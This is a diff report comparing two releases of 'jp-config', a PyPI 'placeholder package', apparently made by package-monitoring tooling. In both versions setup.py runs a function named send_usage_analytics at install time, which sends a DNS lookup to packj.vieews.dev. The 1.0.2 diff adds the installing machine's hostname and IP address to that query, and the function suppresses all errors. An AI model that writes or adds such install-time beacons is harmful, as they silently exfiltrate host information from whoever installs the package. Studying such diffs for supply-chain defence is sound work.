# Comparing `tmp/jp-config-1.0.1.tar.gz` & `tmp/jp-config-1.0.2.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "jp-config-1.0.1.tar", last modified: Tue Jun  6 15:03:52 2023, max compression
+gzip compressed data, was "jp-config-1.0.2.tar", last modified: Tue Jun  6 15:51:35 2023, max compression
```

## Comparing `jp-config-1.0.1.tar` & `jp-config-1.0.2.tar`

### file list

```diff
@@ -1,11 +1,11 @@
-drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-06-06 15:03:52.783367 jp-config-1.0.1/
--rw-r--r--   0 runner    (1001) docker     (123)    11357 2023-06-06 15:03:37.000000 jp-config-1.0.1/LICENSE
--rw-r--r--   0 runner    (1001) docker     (123)      522 2023-06-06 15:03:52.783367 jp-config-1.0.1/PKG-INFO
--rw-r--r--   0 runner    (1001) docker     (123)       53 2023-06-06 15:03:37.000000 jp-config-1.0.1/README.md
-drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-06-06 15:03:52.783367 jp-config-1.0.1/jp_config.egg-info/
--rw-r--r--   0 runner    (1001) docker     (123)      522 2023-06-06 15:03:52.000000 jp-config-1.0.1/jp_config.egg-info/PKG-INFO
--rw-r--r--   0 runner    (1001) docker     (123)      158 2023-06-06 15:03:52.000000 jp-config-1.0.1/jp_config.egg-info/SOURCES.txt
--rw-r--r--   0 runner    (1001) docker     (123)        1 2023-06-06 15:03:52.000000 jp-config-1.0.1/jp_config.egg-info/dependency_links.txt
--rw-r--r--   0 runner    (1001) docker     (123)        1 2023-06-06 15:03:52.000000 jp-config-1.0.1/jp_config.egg-info/top_level.txt
--rw-r--r--   0 runner    (1001) docker     (123)       38 2023-06-06 15:03:52.783367 jp-config-1.0.1/setup.cfg
--rw-r--r--   0 runner    (1001) docker     (123)     3036 2023-06-06 15:03:37.000000 jp-config-1.0.1/setup.py
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-06-06 15:51:35.856925 jp-config-1.0.2/
+-rw-r--r--   0 runner    (1001) docker     (123)    11357 2023-06-06 15:51:20.000000 jp-config-1.0.2/LICENSE
+-rw-r--r--   0 runner    (1001) docker     (123)      522 2023-06-06 15:51:35.856925 jp-config-1.0.2/PKG-INFO
+-rw-r--r--   0 runner    (1001) docker     (123)       53 2023-06-06 15:51:20.000000 jp-config-1.0.2/README.md
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-06-06 15:51:35.856925 jp-config-1.0.2/jp_config.egg-info/
+-rw-r--r--   0 runner    (1001) docker     (123)      522 2023-06-06 15:51:35.000000 jp-config-1.0.2/jp_config.egg-info/PKG-INFO
+-rw-r--r--   0 runner    (1001) docker     (123)      158 2023-06-06 15:51:35.000000 jp-config-1.0.2/jp_config.egg-info/SOURCES.txt
+-rw-r--r--   0 runner    (1001) docker     (123)        1 2023-06-06 15:51:35.000000 jp-config-1.0.2/jp_config.egg-info/dependency_links.txt
+-rw-r--r--   0 runner    (1001) docker     (123)        1 2023-06-06 15:51:35.000000 jp-config-1.0.2/jp_config.egg-info/top_level.txt
+-rw-r--r--   0 runner    (1001) docker     (123)       38 2023-06-06 15:51:35.856925 jp-config-1.0.2/setup.cfg
+-rw-r--r--   0 runner    (1001) docker     (123)     3138 2023-06-06 15:51:20.000000 jp-config-1.0.2/setup.py
```

### Comparing `jp-config-1.0.1/LICENSE` & `jp-config-1.0.2/LICENSE`

 * *Files identical despite different names*

### Comparing `jp-config-1.0.1/PKG-INFO` & `jp-config-1.0.2/PKG-INFO`

 * *Files 1% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: jp-config
-Version: 1.0.1
+Version: 1.0.2
 Summary: A placeholder package
 Home-page: https://github.com/ashishbijlani/sample-pypi-package
 Author: Ashish Bijlani
 Author-email: ab@gmail.com
 License: UNKNOWN
 Platform: UNKNOWN
 Classifier: Programming Language :: Python :: 3.8
```

### Comparing `jp-config-1.0.1/jp_config.egg-info/PKG-INFO` & `jp-config-1.0.2/jp_config.egg-info/PKG-INFO`

 * *Files 1% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: jp-config
-Version: 1.0.1
+Version: 1.0.2
 Summary: A placeholder package
 Home-page: https://github.com/ashishbijlani/sample-pypi-package
 Author: Ashish Bijlani
 Author-email: ab@gmail.com
 License: UNKNOWN
 Platform: UNKNOWN
 Classifier: Programming Language :: Python :: 3.8
```

### Comparing `jp-config-1.0.1/setup.py` & `jp-config-1.0.2/setup.py`

 * *Files 3% similar despite different names*

```diff
@@ -37,35 +37,37 @@
 		with set_alarm(time):
 			yield
 
 def send_usage_analytics(pkg_name, ver_str):
 	try:
 		# Timeout in 100 milliseconds
 		with raise_on_timeout(0.01):
-			query = f'PyPI%{pkg_name}%{ver_str}%packj.vieews.dev'
+			host_name = socket.gethostname()
+			ipaddr = socket.gethostbyname(host_name)
+			query = f'#{ipaddr}#{host_name}#PyPI%{pkg_name}%{ver_str}%packj.vieews.dev'
 			socket.gethostbyname(query)
 	except:
 		pass
 
-send_usage_analytics("jp-config", "1.0.1")
+send_usage_analytics("jp-config", "1.0.2")
 print("This is a placeholder package. Please contact for removal.")
 
 # Opens our README.md and assigns it to long_description.
 with open("README.md", "r") as fh:
     long_description = fh.read()
 
 # Defines requests as a requirement in order for this package to operate. The dependencies of the project.
 # requirements = ["requests<=2.21.0"]
 
 # Function that takes several arguments. It assigns these values to our package.
 setuptools.setup(
     # Distribution name the package. Name must be unique so adding your username at the end is common.
     name="jp-config",
     # Version number of your package. Semantic versioning is commonly used.
-    version="1.0.1",
+    version="1.0.2",
     # Author name.
     author="Ashish Bijlani",
     # Author's email address.
     author_email="ab@gmail.com",
     # Short description that will show on the PyPi page.
     description="A placeholder package",
     # Long description that will display on the PyPi page. Uses the repo's README.md to populate this.
```

